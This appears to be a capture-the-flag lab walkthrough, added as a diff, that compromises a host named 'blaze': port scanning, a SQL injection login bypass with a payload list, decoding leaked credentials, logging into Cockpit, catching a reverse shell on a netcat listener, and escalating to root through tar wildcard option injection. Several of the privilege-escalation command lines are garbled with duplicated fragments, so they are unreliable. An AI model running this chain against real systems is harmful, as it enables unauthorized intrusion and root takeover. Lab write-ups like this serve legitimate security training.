@@ -1,0 +1,76 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.243.10 > Cockpit.txt
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
+|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
+|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: blaze
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+9090/tcp open  http    Cockpit web service 198 - 220
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-title: Did not follow redirect to https://192.168.243.10:9090/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+$ gobuster dir -u http://192.168.243.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php,txt,conf -r
+Found login.php
+
+Go login.php and try 
+username: '
+Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%' AND password like '%%'' at line 1
+# Means can try SQLi 
+$ cat /usr/share/wordlists/seclists/Fuzzing/Databases/SQLi/MySQL-SQLi-Login-Bypass.fuzzdb.txt 
+# regex replace as many as you can with your fuzzer for best results:
+# <user-fieldname> <pass-fieldname> <username>
+# also try to brute force a list of possible usernames, including possile admin acct names
+<username>' OR 1=1--
+'OR '' = '      Allows authentication without a valid username.
+<username>'--
+' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
+'OR 1=1--
+
+# Successfult with username: 'OR '' = ' and get 
+
+Username	Password
+james	Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=
+cameron	dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy
+
+# base64 decode
+james:canttouchhhthiss@455152
+cameron:thisscanttbetouchedd@455152
+
+Login to https://192.168.243.10:9090 the cockpit login page by james:canttouchhhthiss@455152
+Found terminal session in Dashboard. make a reverse shell to my Kali.
+$ rlwrap nc -nlvp 4444 
+listening on [any] 4444 ...
+connect to [192.168.45.178] from (UNKNOWN) [192.168.243.10] 33680
+james@blaze:/$ id
+uid=1000(james) gid=1000(james) groups=1000(james)
+
+# Upload LinEnum.sh and run
+Linux version 5.4.0-146-generic (buildd@lcy02-amd64-026) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #163-Ubuntu SMP Fri Mar 17 18:26:02 UTC 2023
+
+[+] We can sudo without supplying a password!
+Matching Defaults entries for james on blaze:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on blaze:
+    (ALL) NOPASSWD: 
+
+[+] Possible sudo pwnage!
+/usr/bin/tar
+/tmp/backup.tar.gz
+
+
+james@blaze:~$ touch ./"--chectouch ./"--checkpoint=1"
+james@blaze:~$ cp /bin/bash bacp /bin/bash bash
+james@blaze:~$ touch ./"--chectouch ./"--checkpoint-action=exec=bash"
+
+sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
+id
+uid=0(root) gid=0(root) groups=0(root)
